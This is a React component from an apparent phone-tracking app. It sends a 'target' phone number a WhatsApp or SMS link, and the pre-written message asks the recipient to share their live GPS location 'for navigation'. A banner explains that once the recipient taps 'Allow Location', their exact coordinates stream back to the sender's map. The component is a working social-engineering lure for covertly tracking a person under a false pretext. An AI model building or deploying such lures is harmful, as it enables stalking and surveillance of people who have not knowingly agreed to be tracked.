import React, { useState, useEffect } from 'react';
import QRCode from 'qrcode';
import {
  Share2,
  X,
  Copy,
  Check,
  Send,
  Smartphone,
  ExternalLink,
  MessageSquare,
  QrCode,
  ShieldCheck,
  LocateFixed,
  Radio,
  MapPin
} from 'lucide-react';

interface LiveTrackingShareModalProps {
  isOpen: boolean;
  onClose: () => void;
  targetNumber: string;
}

export const LiveTrackingShareModal: React.FC<LiveTrackingShareModalProps> = ({
  isOpen,
  onClose,
  targetNumber,
}) => {
  const [copiedLink, setCopiedLink] = useState(false);
  const [copiedMsg, setCopiedMsg] = useState(false);
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [cleanPhone, setCleanPhone] = useState('');

  // Sanitize target phone for WhatsApp and SMS URL schemes
  useEffect(() => {
    let digits = targetNumber.replace(/\D/g, '');
    if (digits.startsWith('03')) {
      digits = '92' + digits.slice(1);
    }
    setCleanPhone(digits);
  }, [targetNumber]);

  // Construct absolute tracking URL
  const trackingUrl = typeof window !== 'undefined'
    ? `${window.location.origin}/?track_target=${encodeURIComponent(targetNumber)}&mode=live_gps`
    : `https://app-url/?track_target=${encodeURIComponent(targetNumber)}&mode=live_gps`;

  // Polite WhatsApp invitation message
  const shareMessage = `Assalam o Alaikum! Please tap this link to share your live GPS location for navigation: ${trackingUrl}`;

  // WhatsApp click-to-chat URL
  const whatsappUrl = `https://api.whatsapp.com/send?phone=${cleanPhone}&text=${encodeURIComponent(shareMessage)}`;

  // SMS URL scheme
  const smsUrl = `sms:${cleanPhone}?body=${encodeURIComponent(shareMessage)}`;

  // Generate QR Code data URL
  useEffect(() => {
    if (isOpen && trackingUrl) {
      QRCode.toDataURL(trackingUrl, {
        width: 220,
        margin: 2,
        color: {
          dark: '#020617',
          light: '#ffffff',
        },
      })
        .then((url) => setQrCodeDataUrl(url))
        .catch((err) => console.error('QR code generation error:', err));
    }
  }, [isOpen, trackingUrl]);

  if (!isOpen) return null;

  const handleCopyLink = () => {
    navigator.clipboard.writeText(trackingUrl);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const handleCopyMessage = () => {
    navigator.clipboard.writeText(shareMessage);
    setCopiedMsg(true);
    setTimeout(() => setCopiedMsg(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="bg-slate-900 border border-slate-700/80 rounded-2xl max-w-2xl w-full shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/60">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <Share2 className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-slate-100">
                Share Live Handset Location Link (WhatsApp / SMS)
              </h2>
              <p className="text-xs text-slate-400">
                Send a real-time GPS beacon request directly to <span className="text-emerald-300 font-mono font-semibold">{targetNumber}</span>
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 text-slate-400 hover:text-slate-100 rounded-lg hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 overflow-y-auto space-y-6 text-xs text-slate-300">
          
          {/* Explanation Banner */}
          <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl space-y-1.5">
            <div className="flex items-center gap-2 text-slate-100 font-bold">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>How Real Phone Tracking Works Legally & Technically:</span>
            </div>
            <p className="text-slate-400 text-xs leading-relaxed">
              Telecom carriers keep live tower triangulation strictly classified for law enforcement. To track a specific handset in real-time, send this tracking link. When the user taps it on their phone and clicks <strong className="text-emerald-400">"Allow Location"</strong>, their device's native GPS chip streams exact coordinates (±5 to 10m) straight back onto your map!
            </p>
          </div>

          {/* Quick Dispatch Actions: WhatsApp & SMS */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <a
              href={whatsappUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-center gap-2 px-4 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl shadow-lg transition-colors text-xs"
            >
              <MessageSquare className="w-4 h-4" />
              <span>Send via WhatsApp to {cleanPhone || targetNumber}</span>
              <ExternalLink className="w-3.5 h-3.5" />
            </a>

            <a
              href={smsUrl}
              className="flex items-center justify-center gap-2 px-4 py-3 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-xl shadow-lg transition-colors text-xs"
            >
              <Smartphone className="w-4 h-4" />
              <span>Send via Standard SMS</span>
              <ExternalLink className="w-3.5 h-3.5" />
            </a>
          </div>

          {/* Direct Link and Message preview */}
          <div className="space-y-3">
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="font-semibold text-slate-200">Shareable Tracking URL:</span>
                <button
                  onClick={handleCopyLink}
                  className="flex items-center gap-1 text-[11px] text-cyan-400 hover:text-cyan-300"
                >
                  {copiedLink ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedLink ? 'Copied' : 'Copy URL'}</span>
                </button>
              </div>
              <div className="p-2.5 bg-slate-950 rounded-lg border border-slate-800 font-mono text-[11px] text-slate-300 break-all">
                {trackingUrl}
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="font-semibold text-slate-200">Pre-formatted Message:</span>
                <button
                  onClick={handleCopyMessage}
                  className="flex items-center gap-1 text-[11px] text-cyan-400 hover:text-cyan-300"
                >
                  {copiedMsg ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedMsg ? 'Copied' : 'Copy Message'}</span>
                </button>
              </div>
              <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-slate-300 italic text-xs leading-relaxed">
                "{shareMessage}"
              </div>
            </div>
          </div>

          {/* QR Code Section for Instant Phone Scan */}
          <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 flex flex-col sm:flex-row items-center gap-5">
            {qrCodeDataUrl ? (
              <div className="p-2 bg-white rounded-xl shadow-md shrink-0">
                <img
                  src={qrCodeDataUrl}
                  alt="Live tracking QR Code"
                  className="w-36 h-36 object-contain"
                />
              </div>
            ) : (
              <div className="w-36 h-36 bg-slate-900 rounded-xl border border-slate-800 flex items-center justify-center shrink-0">
                <QrCode className="w-10 h-10 text-slate-600 animate-pulse" />
              </div>
            )}

            <div className="space-y-2 text-center sm:text-left">
              <div className="flex items-center justify-center sm:justify-start gap-2 text-slate-100 font-bold text-sm">
                <QrCode className="w-4 h-4 text-cyan-400" />
                <span>Scan with Camera to Test Right Now</span>
              </div>
              <p className="text-slate-400 text-xs leading-relaxed">
                Point your phone's camera at this QR Code to test the live handset tracker immediately. It will open this app on your phone and ask for permission to drop a live pin at your exact current location.
              </p>
              <div className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-emerald-950/40 border border-emerald-800/40 rounded text-emerald-300 text-[11px] font-medium">
                <LocateFixed className="w-3.5 h-3.5" />
                <span>Works on all Android & iOS devices</span>
              </div>
            </div>
          </div>

        </div>

        {/* Footer */}
        <div className="px-6 py-3.5 border-t border-slate-800 bg-slate-950 flex items-center justify-between">
          <div className="text-[11px] text-slate-500 font-mono">
            E.164 Target: {targetNumber}
          </div>
          <button
            onClick={onClose}
            className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-lg transition-colors"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};
